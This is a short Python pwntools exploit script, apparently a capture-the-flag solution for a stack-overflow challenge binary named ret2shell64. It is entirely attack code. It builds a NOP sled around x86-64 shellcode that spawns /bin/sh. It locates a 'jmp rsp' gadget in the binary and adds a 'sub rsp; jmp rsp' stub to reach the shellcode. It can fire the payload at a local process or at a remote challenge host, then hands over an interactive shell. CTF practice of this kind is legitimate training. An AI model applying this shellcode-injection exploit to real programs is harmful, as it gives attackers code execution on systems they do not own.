#!/usr/bin/env python3

from os.path import dirname
from pwn import *

elf = context.binary = ELF(f"{dirname(__file__)}/../generate/ret2shell64")

SHELLCODE = b"\x31\xc0\x48\xbb\xd1\x9d\x96" + \
            b"\x91\xd0\x8c\x97\xff\x48\xf7" + \
            b"\xdb\x53\x54\x5f\x99\x52\x57" + \
            b"\x54\x5e\xb0\x3b\x0f\x05"

PADDING = asm("nop") * (cyclic_find(0x6261616161616169, n=8) - len(SHELLCODE) - 30)
PADDING += SHELLCODE
PADDING += asm("nop") * 30

JMP_RSP = p64(next(elf.search(asm('jmp rsp'))))

SUB_RSP = asm("sub rsp, 0x41; jmp rsp;")


def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='continue')

    if args.REMOTE:
        return remote("pwn.platypew.social", 30003)

    return process(elf.path)

p = start()

p.sendline(PADDING + JMP_RSP + SUB_RSP)
p.interactive()
